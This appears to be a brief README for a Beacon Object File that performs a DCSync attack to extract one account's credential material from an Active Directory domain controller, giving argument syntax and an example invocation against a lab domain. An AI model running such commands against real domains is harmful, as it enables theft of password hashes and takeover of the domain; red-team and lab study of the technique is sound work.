# dcsync
BOF to dcsync a single account's cred material

## Usage
```
dcsync [Target DN] [Domain DN] [Domain Controller]

Args:
- Target DN         : wide string/Z
- Domain DN         : wide string/Z
- Domain Controller : wide string/Z
```

Example:
```
dcsync "CN=eddard.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local" "DC=north,DC=sevenkingdoms,DC=local" "winterfell.north.sevenkingdoms.local"
```


## References
- [DCSyncer](https://github.com/notsoshant/DCSyncer)
- [SharpKatz](https://github.com/b4rtik/SharpKatz)